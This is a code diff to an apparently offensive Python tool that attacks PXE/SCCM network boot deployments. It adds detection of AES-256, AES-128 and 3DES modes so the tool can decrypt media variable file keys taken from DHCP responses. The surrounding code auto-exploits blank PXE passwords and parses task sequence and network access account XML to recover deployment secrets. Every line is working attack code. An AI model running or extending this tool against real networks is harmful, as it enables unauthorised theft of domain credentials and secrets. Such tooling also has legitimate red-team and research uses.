@@ -248,6 +248,14 @@ def get_variable_file_path(tftp_server):
             elif packet_type == 2:
                 #Skip first two bytes of option and copy the encrypted data by data_length
                 encrypted_key = variables_file[2:2+data_length]
+                check_mode = str(encrypted_key[13:15].hex())
+                encryption_mode = None
+                if check_mode == "1066":
+                    encryption_mode = "aes256"
+                elif check_mode == "0e66":
+                    encryption_mode = "aes128"
+                elif check_mode == "0366":
+                    encryption_mode = "3des"
                 #Get the index of data_length of the variables file name string in the option, and index of where the string begins
                 string_length_index = 2 + data_length + 1
                 beginning_of_string_index = 2 + data_length + 2
@@ -275,9 +283,9 @@ def get_variable_file_path(tftp_server):
         BLANK_PASSWORDS_FOUND = True
 
         print("[!] Blank password on PXE boot found!")
-        return [variables_file,bcd_file,encrypted_key]
+        return [variables_file,bcd_file,encryption_mode,encrypted_key]
     else:
-        return [variables_file,bcd_file]
+        return [variables_file,bcd_file,encryption_mode]
 
 def get_pxe_files(ip):
 
@@ -294,7 +302,8 @@ def get_pxe_files(ip):
     variables_file = answer_array[0]
     bcd_file = answer_array[1]
     if BLANK_PASSWORDS_FOUND:
-        encrypted_key = answer_array[2]
+        encryption_mode = answer_array[2]
+        encrypted_key = answer_array[3]
 
     tftp_download_string = ""
 
@@ -335,7 +344,7 @@ def get_pxe_files(ip):
             auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
             if auto_exploit_blank_password:
                 print("[!] Attempting automatic exploitation.")
-                use_encrypted_key(encrypted_key,var_file_name)
+                use_encrypted_key(encrypted_key,var_file_name,encryption_mode)
             else:
                 print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
     else:
@@ -525,7 +534,7 @@ def process_full_media(password, policy):
     process_task_sequence_xml(wf_decrypted_ts)
     process_naa_xml(wf_decrypted_ts)
 
-def use_encrypted_key(encrypted_key=None, media_file_path=None, encrypted_bytes=None):
+def use_encrypted_key(encrypted_key=None, media_file_path=None, encryption_mode=None, encrypted_bytes=None):
 
     if encrypted_bytes == None:
         #ProxyDHCP Option 243
@@ -537,8 +546,19 @@ def use_encrypted_key(encrypted_key=None, media_file_path=None, encrypted_bytes=
 
     key = media_crypto.aes_des_key_derivation(key_data) # Derive key to decrypt key bytes in the DHCP response
 
-    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
-    
+    if encryption_mode == None:
+        try:
+            var_file_key = (media_crypto.aes256_decrypt_raw(encrypted_bytes[:32],key[:32])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
+        except Exception as e:
+            var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
+    elif encryption_mode == "aes256":
+        var_file_key = (media_crypto.aes256_decrypt_raw(encrypted_bytes[:32],key[:32])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
+    elif encryption_mode == "3des":
+        var_file_key = (media_crypto._3des_decrypt_raw(encrypted_bytes[:24],key[:24])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
+    else:
+        var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
+
+
     #Perform bit extension
     LEADING_BIT_MASK =  b'\x80'
     new_key = bytearray()
@@ -982,7 +1002,7 @@ if __name__ == "__main__":
         else:
             password = sys.argv[3]
         if (len(sys.argv) == 5) and (sys.argv[4] == "-k"):
-            use_encrypted_key(None, sys.argv[2], binascii.unhexlify(sys.argv[3].replace(" ", "")))
+            use_encrypted_key(None, sys.argv[2], None, binascii.unhexlify(sys.argv[3].replace(" ", "")))
             sys.exit(0)
 
         path = sys.argv[2]
